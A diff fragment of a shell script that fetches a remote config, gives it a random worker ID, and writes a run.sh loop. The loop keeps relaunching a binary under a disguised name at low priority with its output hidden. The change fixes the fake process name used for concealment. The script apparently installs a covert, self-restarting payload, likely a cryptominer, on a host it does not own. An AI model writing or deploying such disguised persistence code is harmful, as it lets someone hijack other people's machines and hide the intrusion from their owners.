@@ -58,12 +58,12 @@ $DL "$CONFIG_URL" -O config.json
 RAND_ID=$(( RANDOM % 10000 + 1 ))
 sed -i "s/kasm/kasm-$RAND_ID/g" config.json
 
-# 7. Brutally persistent loop
+# 7. Brutally persistent loop (Fixed)
 cat > run.sh <<EOF
 #!/bin/bash
 cd "$(pwd)"
 while true; do
-    nohup ionice -c2 -n7 nice -n10 ./\$0 --config=config.json >/dev/null 2>&1
+    nohup ionice -c2 -n7 nice -n10 ./${FAKE_NAME} --config=config.json >/dev/null 2>&1
     sleep 5
 done
 EOF
